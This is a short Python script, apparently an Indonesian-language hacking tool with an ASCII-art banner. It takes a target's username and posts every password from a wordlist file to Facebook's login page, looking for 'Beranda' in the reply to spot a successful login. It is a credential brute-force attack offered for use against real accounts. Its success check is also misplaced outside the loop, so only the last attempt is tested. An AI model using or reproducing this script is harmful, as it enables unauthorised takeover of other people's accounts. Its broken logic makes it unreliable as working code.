import requests
import sys

banner = """ 


__      ___         _                ______
\ \    / (_)       | |              |____  |
 \ \  / / _ _______| |_ __ _ _ __ ___   / /
  \ \/ / | |_  / __| __/ _` | '__/ __| / /
   \  /  | |/ /\__ \ || (_| | |  \__ \/ /
    \/   |_/___|___/\__\__,_|_|  |___/_/
    	
   """
print (banner)

email = input("[+]Masukan Username Target:")

url ='https://www.facebook.com/login.php'
ex  = open('wordlist.txt', 'r').readlines()

for line in ex :
    password = line.strip()
    http = requests.post(url,data={'email':email,'pass':password,'login':'submit'})
    content = http.text                                                                     
if "Beranda" in content:
     print  ("[+]Password Ditemukan" + password)

else:
     print ("[-] Password Tidak Ditemukan" + password)

